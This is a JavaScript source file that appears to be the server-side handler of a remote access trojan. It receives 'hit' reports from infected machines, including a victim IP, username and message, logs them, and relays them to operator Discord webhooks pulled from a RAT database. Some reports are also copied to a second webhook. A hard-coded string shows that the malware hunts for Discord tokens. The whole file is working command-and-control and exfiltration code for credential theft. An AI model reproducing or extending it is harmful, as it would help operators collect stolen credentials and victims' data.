import AsciiTable from "ascii-table";
import { WebhookClient, EmbedBuilder } from "discord.js";
import { getClientIp } from "request-ip";

const usernameRegex = /^[a-zA-Z0-9_]{1,16}$/;

export default function handleToken(ratDB, webhookClient, sendError, getNetworth) {
  return async function (req, res) {
    const { id, username = "null", message = "null" } = req.body;
    const ip = getClientIp(req);

    const table = new AsciiTable("Message Hit").setHeading("Type", "Value");
    table.addRow("Code", id);
    table.addRow("Username", username);
    table.addRow("Message", message);
    table.addRow("IP", ip);

    if (
      username.toLowerCase().includes("discord") ||
      (message.toLowerCase().includes("discord") &&
        message != "The RAT has failed in finding a discord token (None Found).") ||
      !usernameRegex.test(username)
    ) {
      table.addRow("Error", "Invalid Request");
      console.log(table.toString());
      return;
    }

    try {
      const { webhook, dhooked } = await ratDB.getWebhook(id);
      const embed = new EmbedBuilder()
        .setColor("#ffff00")
        .setTitle(":incoming_envelope: Message")
        .setDescription(message);

      if (dhooked)
        await webhookClient.send({
          content: "@everyone",
          username: "Message - " + username,
          embeds: [embed],
        });

      if (webhook) {
        const webhookClientCustom = new WebhookClient({ url: webhook });
        await webhookClientCustom.send({
          content: "@everyone",
          username: "Message - " + username,
          embeds: [embed],
        });
      } else {
        table.addRow("Error", "Webhook Not Found");
      }
    } catch (e) {
      var errorMsg;
      if (e.response) {
        errorMsg = e.response.data;
      } else if (e.request) {
        errorMsg = e.request;
      } else {
        errorMsg = e.message;
      }

      table.addRow("Error", e);
    }

    console.log(table.toString());
  };
}
